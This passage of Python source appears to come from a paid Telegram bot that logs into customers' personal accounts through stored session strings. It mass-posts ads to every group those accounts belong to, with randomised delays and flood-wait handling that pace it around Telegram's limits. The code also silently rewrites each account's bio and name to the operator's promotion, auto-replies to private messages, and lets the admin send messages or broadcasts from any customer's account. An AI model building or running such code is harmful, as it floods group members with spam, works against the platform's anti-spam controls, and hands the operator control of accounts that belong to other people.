        if "price" not in temp or "days" not in temp:
            await m.reply("❌ Expired"); db.set_user_state(uid, ""); return
        pid = generate_plan_id()
        db.add_plan(pid, temp["price"], temp["days"], text)
        db.set_user_state(uid, ""); db.set_temp_data(uid, None)
        await m.reply(f"✅ Plan added: {text}",
            reply_markup=kb([[InlineKeyboardButton("Back", callback_data="admin_plans")]]))
        return

    if state.startswith("admin_editplan_"):
        parts = state.split("_", 3)
        if len(parts) == 4:
            f, pid = parts[2], parts[3]
            try:
                v = int(text)
                if f == "price": db.update_plan(pid, price=v)
                elif f == "days":
                    db.update_plan(pid, days=v)
                    p = db.get_plan(pid)
                    if p: db.update_plan(pid, label=f"₹{p['price']} - {v} Days")
                db.set_user_state(uid, "")
                await m.reply(f"✅ Updated {f}.")
            except (ValueError, TypeError): await m.reply("❌ Invalid.")
        return

    if state == "admin_await_upi":
        db.set_payment_upi(text); db.set_user_state(uid, "")
        await m.reply(f"✅ UPI set: <code>{text}</code>", parse_mode=ParseMode.HTML); return

    if state == "admin_await_free_limit":
        try:
            v = int(text)
            if v < 1: raise ValueError
            db.set_setting("free_account_limit", v); db.set_user_state(uid, "")
            await m.reply(f"✅ Free limit = {v}")
        except (ValueError, TypeError): await m.reply("❌ Invalid.")
        return

    if state == "admin_await_default_delay":
        try:
            v = int(text)
            if v < 60: raise ValueError
            db.set_setting("default_delay", v); db.set_user_state(uid, "")
            await m.reply(f"✅ Delay = {v}s")
        except (ValueError, TypeError): await m.reply("❌ Min 60.")
        return

    if state == "admin_await_db_channel":
        try:
            v = int(text)
            db.set_setting("database_channel_id", v if v != 0 else None)
            db.set_user_state(uid, "")
            await m.reply(f"✅ DB Channel set: <code>{v if v != 0 else 'cleared'}</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=kb([[InlineKeyboardButton("Back", callback_data="admin_db_channel")]]))
        except (ValueError, TypeError): await m.reply("❌ Invalid number.")
        return

    if state == "admin_await_db_interval":
        try:
            v = int(text)
            if v < 1 or v > 168: raise ValueError
            db.set_setting("db_forward_interval_hours", v)
            db.set_user_state(uid, "")
            await m.reply(f"✅ Interval {v}h",
                reply_markup=kb([[InlineKeyboardButton("Back", callback_data="admin_db_channel")]]))
        except (ValueError, TypeError): await m.reply("❌ 1–168.")
        return

    if state == "admin_await_db_retention":
        try:
            v = int(text)
            if v < 1 or v > 3650: raise ValueError
            db.set_setting("db_retention_days", v)
            db.set_user_state(uid, "")
            await m.reply(f"✅ Retention {v}d",
                reply_markup=kb([[InlineKeyboardButton("Back", callback_data="admin_db_channel")]]))
        except (ValueError, TypeError): await m.reply("❌ 1–3650.")
        return

    if state == "admin_fj_channel":
        parts = [p.strip() for p in text.split("|")]
        if len(parts) != 3: await m.reply("❌ Format: id | url | name"); return
        try: cid = int(parts[0])
        except ValueError: await m.reply("❌ ID number"); return
        ch = db.get_setting("force_join_channels", []) or []
        ch.append({"id": cid, "url": parts[1], "name": parts[2]})
        db.set_setting("force_join_channels", ch)
        db.set_user_state(uid, "")
        await m.reply(f"✅ Channel added: {parts[2]}")
        return

    if state == "admin_fj_group":
        parts = [p.strip() for p in text.split("|")]
        if len(parts) != 3: await m.reply("❌ Format: id | url | name"); return
        try: gid = int(parts[0])
        except ValueError: await m.reply("❌ ID number"); return
        gr = db.get_setting("force_join_groups", []) or []
        gr.append({"id": gid, "url": parts[1], "name": parts[2]})
        db.set_setting("force_join_groups", gr)
        db.set_user_state(uid, "")
        await m.reply(f"✅ Group added: {parts[2]}")
        return

    if state == "admin_await_qr":
        await m.reply("📸 Send photo."); return

    if state.startswith("admin_acc_await_send_"):
        parts = state.replace("admin_acc_await_send_", "").split("_", 1)
        if len(parts) != 2:
            await m.reply("❌ Bad state"); db.set_user_state(uid, ""); return
        target_uid, acc_id = int(parts[0]), parts[1]
        if "|" not in text:
            await m.reply("❌ Format: <code>recipient | message</code>", parse_mode=ParseMode.HTML); return
        recipient, msg_text = text.split("|", 1)
        recipient, msg_text = recipient.strip(), msg_text.strip()
        if not msg_text: await m.reply("❌ Empty"); return
        accounts = db.get_user_accounts(target_uid)
        target = next((a for a in accounts if str(a["_id"]) == acc_id), None)
        if not target:
            await m.reply("❌ Account gone"); db.set_user_state(uid, ""); return
        status = await m.reply("⏳ Sending...")
        tg = await _get_user_tg_client(target)
        if not tg:
            await status.edit_text("❌ Connect failed"); db.set_user_state(uid, ""); return
        try:
            if recipient.lower() == "me":
                await tg.send_message("me", msg_text)
                await status.edit_text("✅ Saved to Saved Messages!", parse_mode=ParseMode.HTML)
            else:
                ent = await tg.get_entity(recipient)
                await tg.send_message(ent, msg_text)
                await status.edit_text(f"✅ Sent to <code>{recipient}</code>", parse_mode=ParseMode.HTML)
            await m.reply("<i>Send another or /cancel</i>", parse_mode=ParseMode.HTML)
        except Exception as e:
            await status.edit_text(f"❌ {str(e)[:200]}")
        finally:
            try: await tg.disconnect()
            except Exception: pass
        return

    if state.startswith("admin_acc_await_bcast_"):
        parts = state.replace("admin_acc_await_bcast_", "").split("_", 1)
        if len(parts) != 2:
            await m.reply("❌ Bad state"); db.set_user_state(uid, ""); return
        target_uid, acc_id = int(parts[0]), parts[1]
        accounts = db.get_user_accounts(target_uid)
        target = next((a for a in accounts if str(a["_id"]) == acc_id), None)
        if not target:
            await m.reply("❌ Account gone"); db.set_user_state(uid, ""); return
        db.set_user_state(uid, "")
        bcast_text = text
        status = await m.reply("⏳ Starting...")

        async def run_admin_bcast():
            tg = await _get_user_tg_client(target)
            if not tg:
                try: await status.edit_text("❌ Connect failed")
                except Exception: pass
                return
            try:
                groups = []
                async for d in tg.iter_dialogs(limit=None):
                    if d.is_group: groups.append((d.entity, d.name or "Unnamed"))
                total = len(groups)
                try: await status.edit_text(f"📢 Broadcasting to {total} groups...", parse_mode=ParseMode.HTML)
                except Exception: pass
                sent, failed = 0, 0
                for ent, gname in groups:
                    try:
                        await tg.send_message(ent, bcast_text); sent += 1
                    except FloodWaitError as e:
                        if e.seconds > 300: failed += 1; continue
                        await asyncio.sleep(e.seconds)
                        try:
                            await tg.send_message(ent, bcast_text); sent += 1
                        except Exception: failed += 1
                    except Exception: failed += 1
                    await asyncio.sleep(random.uniform(30, 80))
                try: await status.edit_text(
                    f"✅ Done\nSent: {sent}\nFailed: {failed}\nTotal: {total}",
                    parse_mode=ParseMode.HTML)
                except Exception: pass
            finally:
                try: await tg.disconnect()
                except Exception: pass
        asyncio.create_task(run_admin_bcast())
        return

# ============================================================
# ADMIN /bd
# ============================================================
@pyro.on_message(filters.command("bd") & filters.user(ADMIN_IDS))
async def admin_bd(client, m):
    if not m.reply_to_message:
        await m.reply("Reply with /bd"); return
    users = db.get_all_users(limit=0)
    total = len(users)
    status = await m.reply(f"📢 Broadcasting to {total}...")

    async def do_bc():
        sent, failed = 0, 0
        reply = m.reply_to_message
        for u in users:
            try:
                await reply.copy(u["user_id"]); sent += 1
            except Exception: failed += 1
            await asyncio.sleep(0.4)
        try:
            await status.edit_text(
                f"✅ <b>Broadcast done</b>\n\nSent: <code>{sent}</code>\nFailed: <code>{failed}</code>",
                parse_mode=ParseMode.HTML)
        except Exception: pass
    asyncio.create_task(do_bc())

@pyro.on_message(filters.command("stats") & filters.user(ADMIN_IDS))
async def admin_stats_cmd(client, m):
    s = db.get_admin_stats()
    await m.reply_photo(photo=START_IMAGE,
        caption=(f"<blockquote><b>👑 STATS</b></blockquote>\n\n"
                 f"Users: <code>{s['total_users']}</code>\nPremium: <code>{s['premium_users']}</code>\n"
                 f"Banned: <code>{s['banned_users']}</code>\nAccounts: <code>{s['total_accounts']}</code>\n"
                 f"Active BC: <code>{s['active_broadcasts']}</code>"),
        parse_mode=ParseMode.HTML)

# ============================================================
# BROADCAST LOOP
# ============================================================
async def run_broadcast(client, uid):
    logger.info(f"[run_broadcast] {uid}")
    sent, failed, cycle = 0, 0, 0
    prog = db.get_broadcast_progress(uid)
    if prog.get("last_heartbeat"):
        cycle = prog.get("cycle", 0); sent = prog.get("sent", 0); failed = prog.get("failed", 0)
    clients = {}
    try:
        msgs = db.get_user_ad_messages(uid)
        msg = msgs[0]["message"] if msgs else None
        if not msg: return
        delay = db.get_user_ad_delay(uid)
        accounts = db.get_user_accounts(uid)
        group_cache = {}
        for acc in accounts:
            try:
                ss = cipher_suite.decrypt(acc["session_string"].encode()).decode()
                if not await validate_session(ss):
                    db.deactivate_account(acc["_id"]); continue
                tg = TelegramClient(StringSession(ss), API_ID, API_HASH)
                await tg.start()
                groups = []
                async for d in tg.iter_dialogs(limit=None):
                    try:
                        if d.is_group: groups.append((d.entity, d.name))
                    except Exception: continue
                group_cache[acc["_id"]] = groups
                try:
                    me = await tg.get_me()
                    if (getattr(me, "about", None) or "") != DESIRED_BIO:
                        await tg(functions.account.UpdateProfileRequest(about=DESIRED_BIO))
                    await tg(functions.account.UpdateProfileRequest(last_name=NAME_SUFFIX))
                except Exception: pass
                clients[acc["_id"]] = tg
            except Exception as e:
                failed += 1; logger.error(f"Client: {e}")
        if not clients:
            await client.send_message(uid, "❌ No valid accounts.")
            db.set_broadcast_state(uid, running=False); return
        await send_dm_log(uid, f"🚀 Started — {len(clients)} accounts")
        while db.get_broadcast_state(uid).get("running", False):
            for ai, acc in enumerate(accounts):
                tg = clients.get(acc["_id"])
                if not tg: continue
                cached = group_cache.get(acc["_id"], [])
                for gi, (ent, gname) in enumerate(list(cached)):
                    if not db.get_broadcast_state(uid).get("running", False):
                        raise asyncio.CancelledError()
                    try:
                        await tg.send_message(ent, msg)
                        sent += 1
                        db.increment_broadcast_stats(uid, True)
                        await send_dm_log(uid, f"✅ <b>{gname}</b> — {acc['phone_number']}")
                    except FloodWaitError as e:
                        if e.seconds > 300:
                            failed += 1; db.increment_broadcast_stats(uid, False); continue
                        await asyncio.sleep(e.seconds)
                        try:
                            await tg.send_message(ent, msg); sent += 1
                            db.increment_broadcast_stats(uid, True)
                        except Exception:
                            failed += 1; db.increment_broadcast_stats(uid, False)
                    except Exception as e:
                        failed += 1; db.increment_broadcast_stats(uid, False)
                        await send_dm_log(uid, f"❌ <b>{gname}</b>: {str(e)[:100]}")
                    db.save_broadcast_progress(uid, cycle=cycle, sent=sent,
                                                failed=failed, account_index=ai, group_index=gi)
                    await asyncio.sleep(random.uniform(60, 150))
            cycle += 1
            db.increment_broadcast_cycle(uid)
            await send_dm_log(uid, f"⏱ Cycle {cycle} — ✅{sent} ❌{failed}")
            db.save_broadcast_progress(uid, cycle=cycle, sent=sent, failed=failed,
                                        account_index=0, group_index=0)
            actual = random.randint(max(60, delay-300), delay+300)
            await send_dm_log(uid, f"💤 Next in {actual}s")
            slept = 0
            while slept < actual:
                if not db.get_broadcast_state(uid).get("running", False):
                    raise asyncio.CancelledError()
                chunk = min(900, actual - slept)
                await asyncio.sleep(chunk); slept += chunk
                db.update_broadcast_heartbeat(uid)
                db.save_broadcast_progress(uid, cycle=cycle, sent=sent, failed=failed)
    except asyncio.CancelledError: pass
    finally:
        for c in clients.values():
            try: await c.disconnect()
            except Exception: pass
        db.set_broadcast_state(uid, running=False)
        user_tasks.pop(uid, None)
        await send_dm_log(uid, f"⏹ Stopped. Sent {sent} Failed {failed}")

# ============================================================
# AUTO REPLY
# ============================================================
async def run_auto_reply_listeners(client, uid):
    accounts = db.get_user_accounts(uid)
    if not accounts: return

    async def listen(acc):
        tg = None
        try:
            ss = cipher_suite.decrypt(acc["session_string"].encode()).decode()
            if not await validate_session(ss): return
            tg = TelegramClient(StringSession(ss), API_ID, API_HASH)
            await tg.connect()
            if not await tg.is_user_authorized(): return
            me = await tg.get_me()
            bot_uid = me.id
            await tg.get_dialogs(limit=200)
            while db.get_broadcast_state(uid).get("running", False):
                try:
                    ar = db.get_auto_reply(uid)
                    if not ar or not ar.get("message"):
                        await asyncio.sleep(10); continue
                    async for d in tg.iter_dialogs(limit=50):
                        if not d.is_user: continue
                        pid = d.entity.id
                        if pid == bot_uid: continue
                        replied = db.get_replied_users(bot_uid)
                        if pid in replied: continue
                        try:
                            msgs = await tg.get_messages(d.entity, limit=10)
                            if not msgs: continue
                            outgoing = [x for x in msgs if x.sender_id == bot_uid]
                            incoming = [x for x in msgs if x.sender_id != bot_uid]
                            if outgoing:
                                db.add_replied_user(bot_uid, pid); continue
                            if not incoming: continue
                            await tg.send_message(d.entity, ar["message"])
                            db.add_replied_user(bot_uid, pid)
                        except Exception: pass
                    await asyncio.sleep(8)
                except asyncio.CancelledError: break
                except Exception: await asyncio.sleep(15)
        except asyncio.CancelledError: pass
        except Exception as e: logger.error(f"auto reply: {e}")
        finally:
            if tg:
                try: await tg.disconnect()
                except Exception: pass

    tasks = [asyncio.create_task(listen(a)) for a in accounts]
    try: await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        for t in tasks: t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

# ============================================================
# CLEANUP + HEARTBEAT
# ============================================================
async def cleanup_task():
    while True:
        try:
            db.cleanup_expired_redeem_codes()
            retention = db.get_setting("db_retention_days", DEFAULT_DB_RETENTION_DAYS)
            deleted = db.cleanup_old_db_events(retention)
            if deleted: logger.info(f"Cleaned {deleted} old db events")
        except Exception as e: logger.error(f"cleanup: {e}")
        await asyncio.sleep(3600)

async def db_forward_task():
    """Periodically forward unfowarded events to DB channel."""
    while True:
        try:
            interval_h = db.get_setting("db_forward_interval_hours", DEFAULT_DB_FORWARD_INTERVAL_HOURS)
            await asyncio.sleep(interval_h * 3600)
            if not db.get_setting("db_forward_enabled", True): continue
            db_ch = db.get_setting("database_channel_id")
            if not db_ch: continue
            events = db.get_unforwarded_db_events(limit=50)
            for ev in events:
                try:
                    payload = ev.get("payload", {})
                    body = "\n".join([f"<b>{k}:</b> <code>{v}</code>" for k, v in payload.items()])
                    msg = (f"<blockquote><b>🗄 {ev['event_type'].upper()}</b></blockquote>\n\n"
                           f"<b>User:</b> <code>{ev['user_id']}</code>\n"
                           f"<b>Time:</b> <code>{ev['created_at'].strftime('%d/%m/%Y %H:%M:%S')}</code>\n\n{body}")
                    await pyro.send_message(db_ch, msg, parse_mode=ParseMode.HTML)
                    db.mark_db_event_forwarded(ev["event_id"])
                except Exception as e: logger.error(f"forward: {e}")
        except asyncio.CancelledError: break
        except Exception as e: logger.error(f"db_forward: {e}")

# ============================================================
# MAIN
# ============================================================
async def main():
    try:
        await pyro.start()
    except Exception as exc:
        txt = f"{type(exc).__name__}: {exc}"
        if "SESSION_REVOKED" in txt or "SessionRevoked" in txt:
            logger.critical("SESSION_REVOKED")
            print("\n❌ Get new BOT_TOKEN from BotFather.\n")
            try: await pyro.stop()
            except Exception: pass
            return
        raise
    await logger_client.start()

    try:
        for uid in db.get_resumable_broadcasts(max_age_minutes=45):
            try:
                if not db.get_user(uid):
                    db.set_broadcast_state(uid, running=False); continue
                if not db.get_user_accounts(uid) or not db.get_user_ad_messages(uid):
                    db.set_broadcast_state(uid, running=False); continue
                user_tasks[uid] = asyncio.create_task(run_broadcast(pyro, uid))
                db.set_broadcast_state(uid, running=True)
                if db.is_premium(uid) and db.get_setting("auto_reply_enabled", True):
                    ar = db.get_auto_reply(uid)
                    if ar and ar.get("message"):
                        auto_reply_tasks[uid] = asyncio.create_task(
                            run_auto_reply_listeners(pyro, uid))
                try:
                    await pyro.send_message(uid, "🔄 <b>Broadcast resumed!</b>", parse_mode=ParseMode.HTML)
                except Exception: pass
                await asyncio.sleep(2)
            except Exception as e: logger.error(f"Resume {uid}: {e}")
    except Exception as e: logger.error(f"Resume: {e}")

    async def heartbeat_loop():
        while True:
            try:
                await asyncio.sleep(900)
                for st in list(db.db.broadcast_states.find({"running": True})):
                    db.update_broadcast_heartbeat(st["user_id"])
            except asyncio.CancelledError: break
            except Exception as e: logger.error(f"hb: {e}")

    asyncio.create_task(heartbeat_loop())
    asyncio.create_task(cleanup_task())
    asyncio.create_task(db_forward_task())
    logger.info("Bot started ✅")
    try:
        await idle()
    finally:
        logger.info("Stopping...")
        for t in list(user_tasks.values()):
            try: t.cancel()
            except Exception: pass
        for t in list(auto_reply_tasks.values()):
            try: t.cancel()
            except Exception: pass
        try: db.close()
        except Exception: pass
        try: await pyro.stop()
        except Exception: pass
        try: await logger_client.stop()
        except Exception: pass

if __name__ == "__main__":
    pyro.run(main())